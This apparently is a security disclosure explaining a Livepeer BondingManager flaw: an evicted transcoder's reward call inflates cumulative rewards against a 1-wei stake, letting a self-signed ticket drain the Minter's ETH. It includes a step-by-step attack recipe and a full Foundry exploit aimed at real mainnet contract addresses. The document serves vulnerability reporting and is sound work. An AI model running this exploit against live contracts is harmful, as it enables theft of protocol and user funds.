# Joe

### Intro

The BondingManager has a vulnerability that allows the cumulative fees in the earnings pool to be increased while the totalstakes remains unchanged. Cumulative fees represent the total amount of collected fees, and this exploit can be used to drain all ETH from the Minter.

![alt text](./images/formula.png)


Generally in protocols when 1e18 is staked, and the fee is set to 10%. The Cumulative rewards are 1e17 with a totalstake of 1e18. The Cumulative fees could/should never be bigger than than the totalstakes.

With this exploit you can increase Cumulative fees while keeping totalstake 1, this causes the rewards for transcodersRewards to skyrocket beyond the expected value, draining the funds allocated for fee distribution.


### Livepeer

Users can bond to a transcoder by staking tokens to earn yield over time. There are multiple transcoders to choose from, each created and managed by users.

A transcoder in the Livepeer network has two main fee structures:

1. Reward Cut Rate: This is the percentage of rewards paid by delegators that the transcoder keeps.
2. Delegator Fee Cut: This is the percentage of transcoding fees that the transcoder distributes to delegators.


###### Note: If a user owns a transcoder, they can configure these fee percentages


#### Protocol Limits

The protocol limits the number of active transcoders. In this case, the maximum is 50 transcoders.

#### Becoming an Active Transcoder

To become an active transcoder, you must bond or stake more ETH than the current least staked active transcoder. By doing so, you replace them and take their spot in the top 50.

For example, if the least staked transcoder has 40 ETH, you must stake more than 40 ETH to become active and "kick them out" of the active pool.

### Where does it go wrong?

When a transcoder is removed from the active transcoder pool:
* Their deactivation round is set, and they are immediately removed from the pool.
* However, their stake in the earnings pool is not reset for this last round.


### Issue in increaseTotalStake:

In the increaseTotalStake function, there's a check:

```solidity
if (transcoderPool.contains(_delegate)) {
    [..]
    t.earningsPoolPerRound[nextRound].setStake(newStake);
    t.lastActiveStakeUpdateRound = nextRound;
}
```

This means the transcoder's new stake is only updated if they are still part of the transcoder pool. If they have been removed, their stake is skipped.


### What Happens in updateTranscoderWithRewards?

Both activeCumulativeRewards and totalStake are supposed to be updated when rewards are calculated.However, when a removed transcoder calls reward:

* activeCumulativeRewards is still increased.
* totalStake is not updated because increaseTotalStake skips the stake update for inactive transcoders.
This creates a mismatch.

**The function updateTranscoderWithFees handles fee distribution.**

```solidity
if (currentRound > lastRewardRound) {
    earningsPool.setCommission(t.rewardCut, t.feeShare);

    uint256 lastUpdateRound = t.lastActiveStakeUpdateRound;
    if (lastUpdateRound < currentRound) {
        earningsPool.setStake(t.earningsPoolPerRound[lastUpdateRound].totalStake);
    }

    activeCumulativeRewards = t.cumulativeRewards;
}
```

* It uses the previous round's stake to update the current round's stake.
* It assigns t.cumulativeRewards as activeCumulativeRewards.

If the transcoder is no longer active, this logic is incorrect. Their previous round's stake and cumulative rewards should no longer influence the current round.


### Redeem Ticket

The ticket mechanism allows users to potentially win rewards by redeeming a winning ticket. However, it is possible to create and redeem a ticket signed by yourself, effectively allowing you to "win" the rewards. While this may seem advantageous, it does not provide any real benefit because you are essentially receiving your own money back. 
These tokens will be staked in the protocol, differently than bonding which is crucial for this exploit.

```solidity
  function redeemWinningTicket(
        Ticket memory _ticket,
        bytes memory _sig,
        uint256 _recipientRand
    ) public whenSystemNotPaused currentRoundInitialized {
        bytes32 ticketHash = getTicketHash(_ticket);

        // Require a valid winning ticket for redemption
        requireValidWinningTicket(_ticket, ticketHash, _sig, _recipientRand);
```


The `RedeemWinningTicket` function transfers the rewarded amount as stake directly to the `BondingManager`. Unlike the regular `bond` function, which users typically call and ensures that the correct values are set, this function does not trigger the same checks. Instead, it calls `updateTranscoderWithFees`, allowing the reward to increase the `cumulativeFees` without adjusting the `totalStake`.

This behavior creates an opening for the exploit, as `updateTranscoderWithFees` can only be called by the `TicketBroker`.

```solidity
    function winningTicketTransfer(
        address _recipient,
        uint256 _amount,
        bytes memory _auxData
    ) internal override {
        (uint256 creationRound, ) = getCreationRoundAndBlockHash(_auxData);

        // Ask BondingManager to update fee pool for recipient with
        // winning ticket funds
        bondingManager().updateTranscoderWithFees(_recipient, _amount, creationRound);
    }
```

### Claim Rewards

To calculate the fees earned by the transcoder from rewards, the formula is:


```solidity
uint256 transcoderRewardStakeFees = PreciseMathUtils.percOf(
    delegatorsFees,
    activeCumulativeRewards,
    totalStake
);
```
Params:
- delegatorFees =>  In this case it is close to 100% of the rewards bonded from the redeem ticket

- activeCumulativeRewards => This value comes from t.cumulativeRewards and increases in the updateTranscoderWithRewards function.

- totalStake => Represents the total stake in the earnings pool, which must also increase by at least the same amount as activeCumulativeRewards. This is because the cumulative rewards of a transcoder are considered bonded stake.



### POC


1. **Initialize a New Transcoder**:  
   - Bond **4000 LPT** to a new transcoder, making it active.

2. **Set Fee Parameters to Maximum**:  
   - Set both the **reward cut rate** and **delegator fee cut rate** to **100%**.

3. **Wait for Activation**:  
   - Wait until the next round when the transcoder becomes active.

4. **Reduce Stake to Minimal**:  
   - Unbond everything except **1 wei** of the transcoder's stake, leaving only a tiny amount staked.

5. **Evict the First Transcoder**:  
   - Bond another transcoder with a higher stake (e.g., **10 LPT**) to evict the first transcoder.

6. **Exploit the Reward Mechanism**:  
   - In the current round, the first transcoder can still call `reward`, increasing its **cumulativeRewards** without increasing the **totalStake** for the next round.

7. **Wait for the Next Round**:  
   - Let the next round begin with the manipulated reward state.

8. **Redeem a Fee Ticket**:  
   - Create and redeem a fee ticket to the first transcoder for any value. The percentage calculation will result in a **massive multiplier** due to the tiny `totalStake`.

9. **Claim Exploited Earnings**:  
   - Call `claimEarnings` to convert the inflated rewards into actual fees.

10. **Drain Funds**:  
    - Use `withdrawFees` to withdraw the entire balance from the **Minter**, draining its funds.




### Coded POC


```solidity
contract PoC is Test {

    LivepeerToken  lpt = LivepeerToken (0x289ba1701C2F088cf0faf8B3705246331cB8A839);
    BondingManager bm  = BondingManager(0x35Bcf3c30594191d53231E4FF333E8A770453e40);
    TicketBroker   tb  = TicketBroker  (0xa8bB618B1520E284046F3dFc448851A1Ff26e41B);
    RoundsManager  rm  = RoundsManager (0xdd6f56DcC28D3F5f27084381fE8Df634985cc39f);

    address constant MINTER = 0xc20DE37170B45774e6CD3d2304017fc962f27252;

    address TICKET_SENDER;
    uint    TICKET_SENDER_KEY = 31337;

    function setUp() public {
        // Fund the attacker with 4010 LPT to main contract
        vm.prank(MINTER);
        lpt.transfer(address(this), 4010 ether);
        // which in turn funds the second contract with 10 LPT
        lpt.transfer(address(0x1337), 10 ether);

        TICKET_SENDER = vm.addr(TICKET_SENDER_KEY);
    }

    function test_poc() public {
        // Check start balance
        console.log("\n{\t[+] Start state\n\t\tMinter balance: %4e ETH\n}", MINTER.balance / 1e14);

        // Bond 4000 LPT from the attacker, enough to become an active transcoder in the forked block
        lpt.approve(address(bm), type(uint).max);
        bm.bond(4000 ether, address(this));
        // Set reward and fee cut rate such that the transcoder gets all rewards but delegators get all fees
        bm.transcoder(1e6, 1e6);

        // Wait for the next round
        _nextRound();

        // Unbond all LPT except 1 wei, such that the transcoder becomes the last active transcoder wth 1 wei stake.
        bm.unbond(4000 ether - 1 wei);
        
        // Secondary attacker contract now bonds with the 10 LPT, kicking the main contract out of the active transcoders
        vm.startPrank(address(0x1337));
        lpt.approve(address(bm), type(uint).max);
        bm.bond(10 ether, address(0x1337));
        vm.stopPrank();

        // Main attacker now calls reward in the last active round, which will increase the activeCumulativeRewards but not the total stake of the next round (because they're not active anymore)
        bm.reward();

        // Wait for the next round
        _nextRound();

        // Prepare a always-winning ticket of 1 ETH to the main attacker contract
        MTicketBrokerCore.Ticket memory ticket = MTicketBrokerCore.Ticket({
            recipient: address(this),
            sender: TICKET_SENDER,
            faceValue: 1 ether,
            winProb: type(uint).max,
            senderNonce: 1,
            recipientRandHash: keccak256(abi.encodePacked(uint(1337))),
            auxData: abi.encodePacked(rm.currentRound(), rm.blockHashForRound(rm.currentRound()))
        });

        // Sign it
        bytes32 ticketHash = keccak256(abi.encodePacked(
            ticket.recipient,
            ticket.sender,
            ticket.faceValue,
            ticket.winProb,
            ticket.senderNonce,
            ticket.recipientRandHash,
            ticket.auxData
        ));        
        bytes32 signHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", ticketHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(TICKET_SENDER_KEY, signHash);
        
        // Ticket sender needs to deposit the assets (they'll be stolen back later)
        payable(TICKET_SENDER).transfer(1 ether);
        vm.prank(TICKET_SENDER);
        tb.fundDeposit{value: 1 ether}();

        // Now redeeming the ticket will give 1 ETH in fees to the main attacker
        // which will be multiplied with a huge multiplier due to the stake being 1 wei and the
        // activeCumulativeRewards being much higher.
        tb.redeemWinningTicket(ticket, abi.encodePacked(r, s, v), 1337);

        // Convert to actual fees
        bm.claimEarnings(0);

        // And withdraw the entire Minter's ETH balance
        bm.withdrawFees(payable(address(this)), MINTER.balance);

        // gg wp
        console.log("\n{\t[+] Final state\n\t\tMinter balance: %4e ETH\n}", MINTER.balance / 1e14);
    }

    function _nextRound() private {
        vm.roll(block.number + 6377);
        rm.initializeRound();
    }

    receive() external payable {}
}
```


